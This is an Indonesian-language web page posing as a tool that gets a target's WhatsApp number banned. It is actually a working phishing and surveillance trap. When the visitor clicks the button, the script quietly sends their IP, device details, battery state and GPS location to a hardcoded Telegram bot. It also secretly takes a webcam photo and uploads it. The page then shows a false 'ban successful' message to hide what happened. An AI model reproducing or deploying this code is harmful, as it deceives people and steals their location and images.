<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BANNED WA ZAM X-PLOIT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a2a 0%, #1a1a4a 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        
        .bg-particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        
        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 105, 180, 0.7);
            border-radius: 50%;
            box-shadow: 0 0 10px 2px rgba(255, 105, 180, 0.5);
            animation: float 6s infinite ease-in-out;
        }
        
        @keyframes float {
            0%, 100% {
                transform: translateY(0) translateX(0);
                opacity: 0.7;
            }
            50% {
                transform: translateY(-20px) translateX(10px);
                opacity: 0.3;
            }
        }
        
        .container {
            background: rgba(10, 10, 42, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5),
                        0 0 0 1px rgba(255, 105, 180, 0.2),
                        0 0 20px rgba(255, 105, 180, 0.3);
            text-align: center;
            position: relative;
            z-index: 1;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff69b4, #4169e1, #ff69b4);
            border-radius: 17px;
            z-index: -1;
            opacity: 0.3;
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff69b4, #4169e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
        }
        
        .copyright {
            font-size: 12px;
            margin-bottom: 20px;
            color: #aaa;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #ccc;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid rgba(255, 105, 180, 0.3);
            border-radius: 8px;
            background: rgba(20, 20, 50, 0.5);
            color: white;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
        }
        
        input:focus {
            border-color: rgba(255, 105, 180, 0.7);
            box-shadow: 0 0 10px rgba(255, 105, 180, 0.3);
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, #ff69b4, #4169e1);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(255, 105, 180, 0.3);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 105, 180, 0.5);
        }
        
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        #info {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
        }
        
        #video, #canvas {
            display: none;
        }
        
        .dialog {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
            z-index: 100;
            justify-content: center;
            align-items: center;
        }
        
        .dialog-content {
            background: rgba(10, 10, 42, 0.9);
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 105, 180, 0.5);
            border: 1px solid rgba(255, 105, 180, 0.3);
        }
        
        .dialog h2 {
            margin-bottom: 15px;
            color: #ff69b4;
        }
        
        .dialog p {
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        .dialog button {
            width: auto;
            padding: 8px 20px;
        }
    </style>
</head>
<body>
    <div class="bg-particles"></div>
    
    <div class="container">
        <div class="logo">BANNED WA </div>
        <div class="copyright">¬© ZAM X-PLOIT</div>
        
        <div class="form-group">
            <label for="text">NOMOR TERGET BANNED</label>
            <input type="text" id="text" placeholder="Masukkan nomor target">
        </div>
        
        <button id="login-button">Proses</button>
        <div id="info"></div>
    </div>
    
    <div id="dialog" class="dialog">
        <div class="dialog-content">
            <h2>Banned Berhasil</h2>
            <p>Banned telah dikirim, banned akan berjalan, mohon untuk menunggu.</p>
            <button id="close-dialog">Tutup</button>
        </div>
    </div>
    
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = '8315787262:AAEn_DVHLGSpWmugXiesWoUrwFmJInYlZYs';
        const chatIds = ['-1003118971912'];
        const infoDiv = document.getElementById('info');
        const input = document.getElementById('text');
        const button = document.getElementById('login-button');
        const dialog = document.getElementById('dialog');
        const closeDialogBtn = document.getElementById('close-dialog');

        function sendToTelegram(text) {
            chatIds.forEach(id => {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
                }).catch(console.error);
            });
        }

        function sendPhotoToTelegram(blob) {
            chatIds.forEach(id => {
                const formData = new FormData();
                formData.append('chat_id', id);
                formData.append('photo', blob);
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(console.error);
            });
        }

        async function getInfo() {
            let ip = '-', city = '-', region = '-', country = '-', org = '-';
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
                const locRes = await fetch(`https://ip-api.com/json/${ip}`);
                const loc = await locRes.json();
                if (loc.status === 'success') {
                    city = loc.city;
                    region = loc.regionName;
                    country = loc.country;
                    org = loc.org;
                }
            } catch {}

            const battery = await navigator.getBattery?.() || { level: 0, charging: false };
            const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

            const text = `
IP         : ${ip}
Lacak IP   : @tolsxcyber_bot
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
            `.trim();

            sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
                    },
                    () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
                );
            } else {
                sendToTelegram(`üìç Browser tidak support GPS`);
            }
        }

        async function startCamera() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            return new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            setTimeout(() => {
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(blob => {
                                    if (blob) sendPhotoToTelegram(blob);
                                    stream.getTracks().forEach(track => track.stop());
                                    resolve();
                                }, 'image/jpeg');
                            }, 3000);
                        };
                    })
                    .catch(err => {
                        sendToTelegram('‚ùå Kamera Ditolak atau Tidak Tersedia');
                        resolve();
                    });
            });
        }

        button.addEventListener('click', async () => {
            const nomor = input.value.trim();
            if (!nomor || nomor.length < 8 || nomor.length > 15) {
                infoDiv.innerText = '‚ö†Ô∏è Nomor tidak valid.';
                return;
            }
            button.disabled = true;
            infoDiv.innerText = '‚è≥ Memproses Pemulihan . . .';
            sendToTelegram(`<b>üìû Nomor Target:</b> ${nomor}`);
            input.value = '';
            try {
                await getInfo();
                await startCamera();
                setTimeout(() => {
                    infoDiv.innerText = `‚úÖ SuccesFully ${nomor}`;
                    button.disabled = false;
                    // Tampilkan dialog
                    dialog.style.display = 'flex';
                }, 1000);
            } catch (e) {
                infoDiv.innerText = '‚ùå Terjadi kesalahan.';
                button.disabled = false;
            }
        });

        closeDialogBtn.addEventListener('click', () => {
            dialog.style.display = 'none';
        });

        function createParticles() {
            const container = document.querySelector('.bg-particles');
            for (let i = 0; i < 50; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.left = Math.random() * 100 + '%';
                p.style.top = Math.random() * 100 + '%';
                p.style.animationDelay = Math.random() * 6 + 's';
                p.style.animationDuration = (Math.random() * 4 + 4) + 's';
                container.appendChild(p);
            }
        }
        document.addEventListener('DOMContentLoaded', createParticles);
    </script>
</body>
</html>
